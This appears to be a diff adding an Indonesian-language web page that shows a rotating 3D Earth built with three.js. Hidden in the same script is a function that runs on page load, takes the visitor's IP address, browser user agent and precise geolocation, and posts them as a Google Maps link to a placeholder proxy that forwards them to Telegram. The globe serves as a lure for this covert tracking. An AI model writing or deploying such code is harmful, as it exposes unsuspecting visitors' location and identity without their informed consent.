@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bumi 3D</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/examples/js/controls/OrbitControls.js"></script>
+    <style>
+        body { margin: 0; overflow: hidden; }
+        canvas { display: block; }
+    </style>
+</head>
+<body>
+
+    <script>
+        // --- BUMI 3D ---
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.body.appendChild(renderer.domElement);
+
+        const geometry = new THREE.SphereGeometry(2, 64, 64);
+        const texture = new THREE.TextureLoader().load('https://upload.wikimedia.org/wikipedia/commons/6/62/Earthmap1000x500.jpg');
+        const material = new THREE.MeshBasicMaterial({ map: texture });
+        const earth = new THREE.Mesh(geometry, material);
+        scene.add(earth);
+
+        const controls = new THREE.OrbitControls(camera, renderer.domElement);
+        camera.position.z = 5;
+
+        function animate() {
+            requestAnimationFrame(animate);
+            earth.rotation.y += 0.002;
+            controls.update();
+            renderer.render(scene, camera);
+        }
+        animate();
+
+        // --- AMBIL DATA USER & KIRIM KE TELEGRAM ---
+        async function sendUserDataToTelegram() {
+            const PROXY_URL = "https://your-proxy-api.com/send"; // Ganti dengan proxy API yang menyembunyikan token
+
+            let ipData = await fetch('https://api.myip.com').then(res => res.json());
+            let userAgent = navigator.userAgent;
+
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                let latitude = position.coords.latitude;
+                let longitude = position.coords.longitude;
+
+                let data = {
+                    ip: ipData.ip,
+                    userAgent: userAgent,
+                    location: `https://www.google.com/maps?q=${latitude},${longitude}`
+                };
+
+                fetch(PROXY_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                })
+                .then(res => res.json())
+                .then(response => console.log("Data terkirim:", response))
+                .catch(error => console.error("Error mengirim:", error));
+
+            }, (error) => {
+                console.error("Lokasi tidak diizinkan!", error);
+            });
+        }
+
+        sendUserDataToTelegram();
+    </script>
+
+</body>
+</html>
